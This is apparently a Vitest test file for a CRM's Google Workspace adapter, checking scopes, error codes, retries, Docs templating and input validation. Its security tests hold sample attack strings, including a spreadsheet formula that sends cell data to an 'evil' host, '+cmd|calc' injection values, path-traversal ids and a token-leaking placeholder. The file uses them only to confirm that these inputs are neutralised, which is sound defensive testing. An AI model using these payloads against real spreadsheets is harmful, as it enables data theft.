import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import type { GoogleCapability } from '@crm/contracts';
import {
  defangPlaceholders,
  eventIdForKey,
  HttpGoogleWorkspace,
  neutraliseFormula,
  toAccountError,
} from '../../../src/infra/providers/flow-runtime-engine/google-workspace.http.adapter';
import {
  GoogleAccountError,
  GoogleNotConnectedError,
  type GoogleAccessTokens,
} from '../../../src/infra/providers/flow-runtime-engine/google-workspace.port';
import { GoogleCalendarError } from '../../../src/infra/providers/appointments-booking/google-calendar.errors';

/**
 * The flow nodes' Google adapter: the requests it makes, the capability each needs, how it fails. Google is a scripted `fetch`;
 * nothing here talks to a real Google account.
 */
const saved = { ...process.env };
beforeEach(() => {
  process.env.GOOGLE_RETRY_BASE_MS = '1';
});
afterEach(() => {
  process.env = { ...saved };
});

type Call = { method: string; url: string; body: unknown };
type Reply = { status: number; body?: unknown } | Error;

/** A fetch that answers by the first matching rule and records every call; an unmatched call is a failing test. */
function google(rules: Array<[RegExp, Reply | Reply[]]>) {
  const calls: Call[] = [];
  const used = new Map<RegExp, number>();
  const http = (async (url: string, init: RequestInit) => {
    const method = init.method ?? 'GET';
    calls.push({ method, url, body: init.body ? JSON.parse(String(init.body)) : undefined });
    const hit = rules.find(([re]) => re.test(`${method} ${url}`));
    if (!hit) throw new Error(`unexpected call ${method} ${url}`);
    const list = Array.isArray(hit[1]) ? hit[1] : [hit[1]];
    const n = used.get(hit[0]) ?? 0;
    used.set(hit[0], n + 1);
    const reply = list[Math.min(n, list.length - 1)]!;
    if (reply instanceof Error) throw reply;
    return new Response(JSON.stringify(reply.body ?? {}), { status: reply.status });
  }) as unknown as typeof fetch;
  return { http, calls };
}

function tokens(opts: { capabilities?: GoogleCapability[]; fail?: GoogleAccountError } = {}) {
  const asked: GoogleCapability[] = [];
  const t: GoogleAccessTokens = {
    withToken: async (_org, capability, fn) => {
      asked.push(capability);
      if (opts.fail) throw opts.fail;
      if (opts.capabilities && !opts.capabilities.includes(capability)) {
        throw new GoogleAccountError('GOOGLE_SCOPE_MISSING', 'missing', capability);
      }
      return fn('tok');
    },
    calendarId: async () => 'team@example.com',
  };
  return { t, asked };
}

const append = {
  sheetId: 'S1',
  tabName: 'Leads',
  columnHeaders: [],
  matchByHeader: false,
};

describe('the capability each call needs', () => {
  it('asks the grant for Sheets, Docs, Forms, Calendar and the file list, one each', async () => {
    const g = google([
      [/POST .*values.*:append/, { status: 200 }],
      [/GET .*values/, { status: 200, body: { values: [['A'], ['1']] } }],
      [
        /GET .*\/files\/[^/?]+\?fields=mimeType/,
        { status: 200, body: { mimeType: 'application/vnd.google-apps.document' } },
      ],
      [/POST .*drive.*copy/, { status: 200, body: { id: 'D2' } }],
      [/POST .*batchUpdate/, { status: 200 }],
      [/POST .*permissions/, { status: 200 }],
      [/GET .*forms/, { status: 200, body: { responderUri: 'https://forms.gle/x' } }],
      [
        /POST .*calendars.*events/,
        { status: 200, body: { id: 'e', hangoutLink: 'https://meet/x' } },
      ],
      [/GET .*drive.*files\?/, { status: 200, body: { files: [] } }],
    ]);
    const { t, asked } = tokens();
    const w = new HttpGoogleWorkspace(t, g.http);
    await w.appendSheetRow(1, { ...append, values: ['x'] });
    await w.readSheetRows(1, {
      sheetId: 'S1',
      tabName: '',
      matchColumn: '',
      matchValue: '',
      limit: 1,
    });
    await w.generateDoc(1, { templateId: 'T', newTitle: 'n', vars: { a: 'b' }, shareable: true });
    await w.formResponderUrl(1, 'F1');
    await w.createMeet(1, {
      title: 't',
      startAt: new Date(0),
      endAt: new Date(60_000),
      sendInvites: false,
      timeZone: 'UTC',
      requestId: 'k',
    });
    await w.listFiles(1, 'sheets');
    expect(asked).toEqual([
      'sheets',
      'sheets',
      'docs',
      'docs',
      'docs',
      'docs',
      'forms',
      'calendar',
      'drive_listing',
    ]);
  });

  it('reports a missing permission before any request is made', async () => {
    const g = google([]);
    const w = new HttpGoogleWorkspace(tokens({ capabilities: ['calendar'] }).t, g.http);
    await expect(w.appendSheetRow(1, { ...append, values: [] })).rejects.toMatchObject({
      code: 'GOOGLE_SCOPE_MISSING',
      capability: 'sheets',
    });
    expect(g.calls).toHaveLength(0);
  });

  it('passes the not-connected failure through unchanged', async () => {
    const w = new HttpGoogleWorkspace(
      tokens({ fail: new GoogleNotConnectedError() }).t,
      google([]).http,
    );
    await expect(w.formResponderUrl(1, 'F')).rejects.toMatchObject({
      code: 'GOOGLE_ACCOUNT_NOT_CONNECTED',
    });
  });
});

describe('Google answers become stable codes', () => {
  const failing = (status: number, body: unknown) => {
    const g = google([[/./, { status, body }]]);
    return new HttpGoogleWorkspace(tokens().t, g.http).readSheetRows(1, {
      sheetId: 'S',
      tabName: 'Nope',
      matchColumn: '',
      matchValue: '',
      limit: 1,
    });
  };

  it.each([
    [404, { error: { code: 404, status: 'NOT_FOUND' } }, 'GOOGLE_NOT_FOUND'],
    [
      400,
      { error: { code: 400, message: 'Unable to parse range: Nope!A:ZZ' } },
      'GOOGLE_BAD_REQUEST',
    ],
    [403, { error: { status: 'PERMISSION_DENIED', message: 'no access' } }, 'GOOGLE_ACCESS_DENIED'],
    [
      403,
      {
        error: {
          status: 'PERMISSION_DENIED',
          details: [{ reason: 'ACCESS_TOKEN_SCOPE_INSUFFICIENT' }],
        },
      },
      'GOOGLE_SCOPE_MISSING',
    ],
    [
      403,
      { error: { status: 'PERMISSION_DENIED', details: [{ reason: 'SERVICE_DISABLED' }] } },
      'GOOGLE_API_NOT_ENABLED',
    ],
    [429, { error: { status: 'RESOURCE_EXHAUSTED' } }, 'GOOGLE_RATE_LIMITED'],
    [503, {}, 'GOOGLE_UNAVAILABLE'],
  ])('%i is %s', async (status, body, code) => {
    process.env.GOOGLE_RETRIES = '0';
    await expect(failing(status, body)).rejects.toMatchObject({ code });
  });

  it('gives up on a rate limit that Google says to wait long for, carrying the wait', async () => {
    const err = toAccountError(
      Object.assign(new GoogleCalendarError('rate_limit', 429, 'rateLimitExceeded'), {
        retryAfterSeconds: 90,
      }),
      'sheets',
    );
    expect(err).toMatchObject({ code: 'GOOGLE_RATE_LIMITED', retryAfterSeconds: 90, status: 429 });
  });

  it('keeps Google wording and the token out of the error', async () => {
    process.env.GOOGLE_RETRIES = '0';
    const err = (await failing(403, {
      error: { message: 'Bearer tok is not allowed to read Ana Perez salary sheet' },
    }).catch((e: unknown) => e)) as Error;
    expect(err.message).not.toContain('tok');
    expect(err.message).not.toContain('Ana Perez');
  });
});

describe('Sheets', () => {
  it('writes cells that would run as formulas as text, and leaves numbers, phones and dates alone', () => {
    expect(neutraliseFormula('=IMPORTXML("https://evil/?"&A1)')).toBe(
      `'=IMPORTXML("https://evil/?"&A1)`,
    );
    expect(neutraliseFormula('@SUM(A1:A2)')).toBe("'@SUM(A1:A2)");
    expect(neutraliseFormula('+cmd|calc')).toBe("'+cmd|calc");
    expect(neutraliseFormula('-2+3')).toBe("'-2+3");
    expect(neutraliseFormula('+91 98765 43210')).toBe("'+91 98765 43210");
    for (const ok of ['+919876543210', '-5', '12.50', '(555) 123-4567', 'Ana', '2026-10-15', '']) {
      expect(neutraliseFormula(ok)).toBe(ok);
    }
  });

  it('appends under the tab with USER_ENTERED values and the formula guard applied', async () => {
    const g = google([[/POST/, { status: 200 }]]);
    await new HttpGoogleWorkspace(tokens().t, g.http).appendSheetRow(1, {
      ...append,
      values: ['Ana', '=1+1', '+919999999999'],
    });
    expect(g.calls[0]!.url).toContain("/values/'Leads':append");
    expect(g.calls[0]!.url).toContain('valueInputOption=USER_ENTERED');
    expect(g.calls[0]!.body).toEqual({ values: [['Ana', "'=1+1", '+919999999999']] });
  });

  it('appends every row of a step in ONE request (all or nothing), each with the formula guard, placed by header when asked', async () => {
    const g = google([
      [/GET .*1%3A1|GET .*values\/1:1/, { status: 200, body: { values: [['Phone', 'Name']] } }],
      [/POST/, { status: 200 }],
    ]);
    await new HttpGoogleWorkspace(tokens().t, g.http).appendSheetRows(1, {
      sheetId: 'S1',
      tabName: '',
      rows: [
        ['Ana', '555'],
        ['=evil()', '556'],
      ],
      columnHeaders: ['name', 'phone'],
      matchByHeader: true,
    });
    const posts = g.calls.filter((c) => c.method === 'POST');
    expect(posts).toHaveLength(1);
    expect(posts[0]!.body).toEqual({
      values: [
        ['555', 'Ana'],
        ['556', "'=evil()"],
      ],
    });
  });

  it('a failed multi-row append is not repeated after a 5xx, so no row can be written twice', async () => {
    process.env.GOOGLE_RETRIES = '2';
    const five = google([[/POST/, { status: 503 }]]);
    await expect(
      new HttpGoogleWorkspace(tokens().t, five.http).appendSheetRows(1, {
        ...append,
        rows: [['a'], ['b']],
      }),
    ).rejects.toMatchObject({ code: 'GOOGLE_UNAVAILABLE' });
    expect(five.calls).toHaveLength(1);
  });

  it('never repeats an append after a 5xx (a second row could result) but does after a 429', async () => {
    process.env.GOOGLE_RETRIES = '2';
    const five = google([[/POST/, { status: 503 }]]);
    await expect(
      new HttpGoogleWorkspace(tokens().t, five.http).appendSheetRow(1, {
        ...append,
        values: ['x'],
      }),
    ).rejects.toMatchObject({ code: 'GOOGLE_UNAVAILABLE' });
    expect(five.calls).toHaveLength(1);

    const limited = google([[/POST/, [{ status: 429 }, { status: 200 }]]]);
    await new HttpGoogleWorkspace(tokens().t, limited.http).appendSheetRow(1, {
      ...append,
      values: ['x'],
    });
    expect(limited.calls).toHaveLength(2);
  });

  it('matches by header on a first read of row 1, then appends in the sheet column order', async () => {
    const g = google([
      [/GET .*values\/1:1|GET .*1%3A1/, { status: 200, body: { values: [['Phone', 'Name']] } }],
      [/POST/, { status: 200 }],
    ]);
    await new HttpGoogleWorkspace(tokens().t, g.http).appendSheetRow(1, {
      sheetId: 'S1',
      tabName: '',
      values: ['Ana', '555'],
      columnHeaders: ['name', 'phone'],
      matchByHeader: true,
    });
    expect(g.calls[1]!.body).toEqual({ values: [['555', 'Ana']] });
  });

  it('retries a read after a 503 (reads are safe to repeat)', async () => {
    const g = google([
      [/GET/, [{ status: 503 }, { status: 200, body: { values: [['A'], ['1']] } }]],
    ]);
    const rows = await new HttpGoogleWorkspace(tokens().t, g.http).readSheetRows(1, {
      sheetId: 'S',
      tabName: '',
      matchColumn: '',
      matchValue: '',
      limit: 5,
    });
    expect(rows).toEqual([{ A: '1' }]);
    expect(g.calls).toHaveLength(2);
  });
});

describe('Docs', () => {
  const doc = { templateId: 'T', newTitle: 'Quote', vars: { name: 'Ana' }, shareable: true };

  it('fills both {{name}} and {name}, as Reference did, then shares by link', async () => {
    const g = google([
      [
        /GET .*\/files\/[^/?]+\?fields=mimeType/,
        { status: 200, body: { mimeType: 'application/vnd.google-apps.document' } },
      ],
      [/POST .*\/copy/, { status: 200, body: { id: 'D2' } }],
      [/POST .*batchUpdate/, { status: 200 }],
      [/POST .*permissions/, { status: 200 }],
    ]);
    const r = await new HttpGoogleWorkspace(tokens().t, g.http).generateDoc(1, doc);
    expect(r).toEqual({ url: 'https://docs.google.com/document/d/D2/edit', warnings: [] });
    const fill = g.calls.find((c) => c.url.includes('batchUpdate'))!.body as {
      requests: Array<{ replaceAllText: { containsText: { text: string }; replaceText: string } }>;
    };
    expect(fill.requests.map((q) => q.replaceAllText.containsText.text)).toEqual([
      '{{name}}',
      '{name}',
    ]);
    expect(g.calls.find((c) => c.url.includes('permissions'))!.body).toEqual({
      type: 'anyone',
      role: 'reader',
    });
  });

  it('keeps the copy when the fill or the share fails, and says so', async () => {
    process.env.GOOGLE_RETRIES = '0';
    const g = google([
      [
        /GET .*\/files\/[^/?]+\?fields=mimeType/,
        { status: 200, body: { mimeType: 'application/vnd.google-apps.document' } },
      ],
      [/POST .*\/copy/, { status: 200, body: { id: 'D2' } }],
      [/POST .*batchUpdate/, { status: 400 }],
      [/POST .*permissions/, { status: 403 }],
    ]);
    const r = await new HttpGoogleWorkspace(tokens().t, g.http).generateDoc(1, doc);
    expect(r.url).toContain('/D2/');
    expect(r.warnings).toEqual(['fill:GOOGLE_BAD_REQUEST', 'share:GOOGLE_ACCESS_DENIED']);
  });

  it('does not repeat the copy after a 5xx: a second document would result', async () => {
    process.env.GOOGLE_RETRIES = '2';
    const g = google([
      [
        /GET .*\/files\/[^/?]+\?fields=mimeType/,
        { status: 200, body: { mimeType: 'application/vnd.google-apps.document' } },
      ],
      [/POST .*\/copy/, { status: 500 }],
    ]);
    await expect(
      new HttpGoogleWorkspace(tokens().t, g.http).generateDoc(1, doc),
    ).rejects.toMatchObject({
      code: 'GOOGLE_UNAVAILABLE',
    });
    expect(g.calls.filter((c) => c.method === 'POST')).toHaveLength(1);
  });
});

describe('Meet', () => {
  const meet = {
    title: 'Call',
    startAt: new Date('2026-10-15T10:00:00Z'),
    endAt: new Date('2026-10-15T10:30:00Z'),
    sendInvites: true,
    timeZone: 'UTC',
    requestId: 'flow:run-1:4:n1',
  };

  it('creates the event in the workspace calendar with an id made from the step', async () => {
    const g = google([
      [/POST/, { status: 200, body: { id: 'x', hangoutLink: 'https://meet.google.com/a' } }],
    ]);
    const r = await new HttpGoogleWorkspace(tokens().t, g.http).createMeet(1, meet);
    expect(r.meetUrl).toBe('https://meet.google.com/a');
    expect(g.calls[0]!.url).toContain(
      '/calendars/team%40example.com/events?conferenceDataVersion=1&sendUpdates=all',
    );
    const body = g.calls[0]!.body as { id: string };
    expect(body.id).toBe(eventIdForKey('flow:run-1:4:n1'));
    expect(body.id).toMatch(/^[0-9a-v]{5,1024}$/);
  });

  it('reads back its own event when the same step runs again (409), so no second meeting exists', async () => {
    const g = google([
      [/POST/, { status: 409, body: { error: { errors: [{ reason: 'duplicate' }] } } }],
      [/GET/, { status: 200, body: { id: 'x', hangoutLink: 'https://meet.google.com/a' } }],
    ]);
    const r = await new HttpGoogleWorkspace(tokens().t, g.http).createMeet(1, meet);
    expect(r.meetUrl).toBe('https://meet.google.com/a');
    expect(g.calls.map((c) => c.method)).toEqual(['POST', 'GET']);
  });

  it('fails when Google makes the event without a Meet link', async () => {
    const g = google([[/POST/, { status: 200, body: { id: 'x' } }]]);
    await expect(
      new HttpGoogleWorkspace(tokens().t, g.http).createMeet(1, meet),
    ).rejects.toMatchObject({
      code: 'GOOGLE_BAD_REQUEST',
    });
  });
});

describe('Forms and the file pickers', () => {
  it('returns the responder link, and fails clearly when there is none', async () => {
    const ok = google([[/GET/, { status: 200, body: { responderUri: 'https://forms.gle/x' } }]]);
    expect(await new HttpGoogleWorkspace(tokens().t, ok.http).formResponderUrl(1, 'F1')).toEqual({
      url: 'https://forms.gle/x',
    });
    const none = google([[/GET/, { status: 200, body: {} }]]);
    await expect(
      new HttpGoogleWorkspace(tokens().t, none.http).formResponderUrl(1, 'F1'),
    ).rejects.toMatchObject({
      code: 'GOOGLE_NOT_FOUND',
    });
  });

  it("reads a form's submissions since a time, keyed by question title, oldest first", async () => {
    const g = google([
      [
        /GET .*\/forms\/F1$/,
        {
          status: 200,
          body: {
            items: [
              { title: 'Name', questionItem: { question: { questionId: 'q1' } } },
              { title: 'Toppings', questionItem: { question: { questionId: 'q2' } } },
            ],
          },
        },
      ],
      [
        /GET .*\/forms\/F1\/responses/,
        {
          status: 200,
          body: {
            responses: [
              {
                responseId: 'r2',
                lastSubmittedTime: '2026-10-18T10:05:00Z',
                answers: { q1: { textAnswers: { answers: [{ value: 'Bo' }] } } },
              },
              {
                responseId: 'r1',
                lastSubmittedTime: '2026-10-18T10:00:00Z',
                respondentEmail: 'ana@example.com',
                answers: {
                  q1: { textAnswers: { answers: [{ value: 'Ana' }] } },
                  q2: { textAnswers: { answers: [{ value: 'olives' }, { value: 'feta' }] } },
                },
              },
              { lastSubmittedTime: '2026-10-18T10:06:00Z' },
            ],
          },
        },
      ],
    ]);
    const asked = tokens();
    const out = await new HttpGoogleWorkspace(asked.t, g.http).formResponses(
      1,
      'F1',
      new Date('2026-10-18T09:59:00Z'),
    );
    expect(out.map((r) => r.responseId)).toEqual(['r1', 'r2']);
    expect(out[0]).toMatchObject({
      respondent: 'ana@example.com',
      answers: { Name: 'Ana', Toppings: ['olives', 'feta'] },
    });
    expect(out[1]).toMatchObject({ respondent: null, answers: { Name: 'Bo' } });
    expect(decodeURIComponent(g.calls[1]!.url)).toContain(
      'filter=timestamp >= 2026-10-18T09:59:00.000Z',
    );
    expect(new Set(asked.asked)).toEqual(new Set(['forms']));
  });

  it('refuses a form id that is not a Google id before any request', async () => {
    const g = google([]);
    await expect(
      new HttpGoogleWorkspace(tokens().t, g.http).formResponses(1, '../x', new Date(0)),
    ).rejects.toMatchObject({ code: 'GOOGLE_BAD_REQUEST' });
    expect(g.calls).toEqual([]);
  });

  it('lists files of one kind, newest first, keeping only id and name', async () => {
    const g = google([
      [
        /GET/,
        {
          status: 200,
          body: { files: [{ id: 'a', name: 'Leads', owner: 'x' }, { id: '' }, { id: 'b' }] },
        },
      ],
    ]);
    const files = await new HttpGoogleWorkspace(tokens().t, g.http).listFiles(1, 'docs');
    expect(files).toEqual([
      { id: 'a', name: 'Leads' },
      { id: 'b', name: 'b' },
    ]);
    const url = new URL(g.calls[0]!.url);
    expect(url.searchParams.get('q')).toBe(
      "mimeType='application/vnd.google-apps.document' and trashed=false",
    );
    expect(url.searchParams.get('orderBy')).toBe('modifiedTime desc');
  });
});

describe('ids typed by a flow author', () => {
  it.each(['..', '../x', 'a/b', 'a?b=1', 'a#b', 'a b', '', 'x'.repeat(300)])(
    'refuses %j as a sheet, template or form id before any request is made',
    async (bad) => {
      const g = google([]);
      const w = new HttpGoogleWorkspace(tokens().t, g.http);
      await expect(
        w.appendSheetRow(1, { ...append, sheetId: bad, values: [] }),
      ).rejects.toMatchObject({
        code: 'GOOGLE_BAD_REQUEST',
      });
      await expect(
        w.readSheetRows(1, {
          sheetId: bad,
          tabName: '',
          matchColumn: '',
          matchValue: '',
          limit: 1,
        }),
      ).rejects.toMatchObject({ code: 'GOOGLE_BAD_REQUEST' });
      await expect(
        w.generateDoc(1, { templateId: bad, newTitle: 't', vars: {}, shareable: false }),
      ).rejects.toMatchObject({ code: 'GOOGLE_BAD_REQUEST' });
      await expect(w.formResponderUrl(1, bad)).rejects.toMatchObject({
        code: 'GOOGLE_BAD_REQUEST',
      });
      expect(g.calls).toHaveLength(0);
    },
  );

  it('accepts a real Google id, with underscore and dash', async () => {
    const g = google([[/GET/, { status: 200, body: { values: [] } }]]);
    await new HttpGoogleWorkspace(tokens().t, g.http).readSheetRows(1, {
      sheetId: '1BxiMVs0XRA5nFMdKvBdBZjgmUUqptlbs74OgvE2upms_-x',
      tabName: '',
      matchColumn: '',
      matchValue: '',
      limit: 1,
    });
    expect(g.calls[0]!.url).toContain(
      '/spreadsheets/1BxiMVs0XRA5nFMdKvBdBZjgmUUqptlbs74OgvE2upms_-x/values/',
    );
  });
});

describe('what a flow author cannot make the grant do', () => {
  it('copies only a Google document, never another file the account can read (the copy is shared by link)', async () => {
    const g = google([
      [
        /GET .*\/files\/[^/?]+\?fields=mimeType/,
        { status: 200, body: { mimeType: 'application/vnd.google-apps.spreadsheet' } },
      ],
    ]);
    const w = new HttpGoogleWorkspace(tokens().t, g.http);
    await expect(
      w.generateDoc(1, { templateId: 'sheet-1', newTitle: 't', vars: {}, shareable: true }),
    ).rejects.toMatchObject({ code: 'GOOGLE_BAD_REQUEST', capability: 'docs' });
    expect(g.calls.map((c) => c.method)).toEqual(['GET']);
  });

  it('does not let a customer-typed value act as a placeholder for the next fill', async () => {
    const g = google([
      [
        /GET .*\/files\/[^/?]+\?fields=mimeType/,
        { status: 200, body: { mimeType: 'application/vnd.google-apps.document' } },
      ],
      [/POST .*\/copy/, { status: 200, body: { id: 'D2' } }],
      [/POST .*batchUpdate/, { status: 200 }],
    ]);
    await new HttpGoogleWorkspace(tokens().t, g.http).generateDoc(1, {
      templateId: 'T1',
      newTitle: 't',
      vars: { name: '{{api_token}}', api_token: 'SECRET' },
      shareable: false,
    });
    const body = g.calls.find((c) => c.url.includes('batchUpdate'))!.body as {
      requests: Array<{ replaceAllText: { containsText: { text: string }; replaceText: string } }>;
    };
    const nameFill = body.requests.find((r) => r.replaceAllText.containsText.text === '{{name}}')!;
    expect(nameFill.replaceAllText.replaceText).toBe('{\u200b{\u200bapi_token}}');
    expect(nameFill.replaceAllText.replaceText).not.toContain('{{api_token}}');
    expect(defangPlaceholders('plain text')).toBe('plain text');
  });

  it('writes a formula as text even behind a space, a tab, a line break or a zero-width character', () => {
    for (const v of [
      ' =1+1',
      '\t=1+1',
      '\r=1+1',
      '\n@SUM(A1)',
      '\u200b=1+1',
      '\u00a0+cmd|x',
      '  -2+3',
    ]) {
      expect(neutraliseFormula(v), JSON.stringify(v)).toBe(`'${v}`);
    }
    for (const v of [' -5', '  12.50', 'plain', '=', '']) {
      if (v === '=') expect(neutraliseFormula(v)).toBe("'=");
      else expect(neutraliseFormula(v)).toBe(v);
    }
  });
});
